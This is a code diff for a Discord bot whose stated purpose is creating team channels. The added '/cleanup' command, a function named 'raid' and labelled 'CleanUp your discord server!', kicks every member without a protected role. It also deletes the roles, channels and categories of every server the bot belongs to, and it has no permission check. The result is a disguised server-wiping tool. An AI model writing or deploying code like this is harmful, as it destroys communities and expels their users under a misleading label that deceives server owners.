@@ -17,7 +17,6 @@ async def on_ready():
 @tree.command(name="help")
 async def help(ctx):
     await ctx.channel.send("/createchannels arg1: num_of_teams arg2: team, names, separated")
-    
     await ctx.channel.send("/cleanup - clears server")
 
 @tree.command(name="createchannels")
@@ -72,22 +71,51 @@ async def createchannels(ctx, channelnumber: int, listofclansarg: str):
     else:
         await ctx.channel.send(f"Incorrect amount of clans: I've gotten {len(clanlist)} clans, but {channelnumber} were expected")
 
-@tree.command(name='cleanup',description="CleanUp your discord server!")
-async def raid(ctx: commands.Context):
-    allObjects = []
-    for guild in client.guilds:
-        for someObject in [guild.roles, guild.text_channels, guild.voice_channels, guild.categories]:
-            for exactObject in someObject:
-                allObjects.append(exactObject)
-        for exactObject in allObjects:
-            try:
-                await exactObject.delete()
-                print(f'| Object has been successfully deleted - {exactObject.id}')
-            except:
-                print(f'| I could not delete some object - {exactObject.id}')
+@tree.command(name="kickteam", description="Kicks all members with specified team role")
+@commands.has_role("admin")
+async def kickTeam(ctx: commands.Context, role: discord.Role):
+    for member in role.members:
+        await member.kick()
+        await ctx.channel.send(f"Kicked {member.display_name}")
 
-        await ctx.guild.create_category("base")
-        category = discord.utils.get(ctx.guild.categories, name="base")
-        await ctx.guild.create_text_channel("base_gen", category=category)
+# Define a list of role and channel names that should not be deleted
+protected_roles = ["Admin", "DiXX_role"]
+protected_channels = ["dixx_general", "DiXX_voice", "DiXX"]
+
+@tree.command(name='cleanup', description="CleanUp your discord server!")
+async def raid(ctx: commands.Context):
+    # Kick members not in protected roles
+    for member in ctx.guild.members:
+        if any(role.name in protected_roles for role in member.roles):
+            continue  # Skip kicking members with protected roles
+        try:
+            await member.kick()
+            await ctx.channel.send(f"Kicked {member.display_name}")
+        except:
+            print(f"| I could not kick {member.display_name}")
+    
+    # Get all roles, channels, and categories in the guild
+    all_objects = []
+    for guild in client.guilds:
+        for some_object in [guild.roles, guild.text_channels, guild.voice_channels, guild.categories]:
+            for exact_object in some_object:
+                all_objects.append(exact_object)
+
+    # Iterate through all objects and delete if not in the protected list
+    for exact_object in all_objects:
+        try:
+            # Check if the object is in the protected list
+            if exact_object.name in protected_roles or exact_object.name in protected_channels:
+                print(f"| Skipping deletion of protected object - {exact_object.name} ({exact_object.id})")
+            else:
+                await exact_object.delete()
+                print(f"| Object has been successfully deleted - {exact_object.name} ({exact_object.id})")
+        except:
+            print(f"| I could not delete some object - {exact_object.name} ({exact_object.id})")
+
+    # Create a category and a text channel after cleanup
+    await ctx.guild.create_category("base")
+    category = discord.utils.get(ctx.guild.categories, name="base")
+    await ctx.guild.create_text_channel("base_gen", category=category)
 
 client.run(discordToken)
